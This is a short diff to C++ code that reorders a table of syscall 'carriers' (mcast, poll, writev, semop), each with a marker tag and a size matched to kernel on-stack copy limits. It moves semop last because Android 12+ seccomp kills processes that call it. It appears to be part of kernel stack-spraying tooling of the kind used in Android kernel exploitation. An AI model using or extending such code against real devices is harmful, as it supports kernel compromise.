@@ -73,11 +73,15 @@ namespace ghostlock::route {
                 uint64_t tag;
                 size_t bytes;
             };
+            /* v12.10: semop goes LAST. Android 12+ blocks the SysV IPC
+             * syscalls in the app seccomp filter — a blocked syscall is
+             * SIGSYS/KILL_PROCESS, which would abort the sweep before the
+             * other carriers ever run. Everything seccomp-safe runs first. */
             const diag_carrier carriers[] = {
                     {"mcast",  0xD00D000000000000ULL, 264},  /* group_source_req, 33 words   */
-                    {"semop",  0xD11D000000000000ULL, 512},  /* 32 sembufs (SEMOPM=32)      */
                     {"poll",   0xD22D000000000000ULL, 256},  /* nfds=32, POLL_STACK_ALLOC   */
                     {"writev", 0xD33D000000000000ULL, 128},  /* UIO_FASTIOV=8 iovecs        */
+                    {"semop",  0xD11D000000000000ULL, 512},  /* 32 sembufs (SEMOPM=32)      */
             };
             const size_t kMax = 512;
             unsigned char buf[kMax];
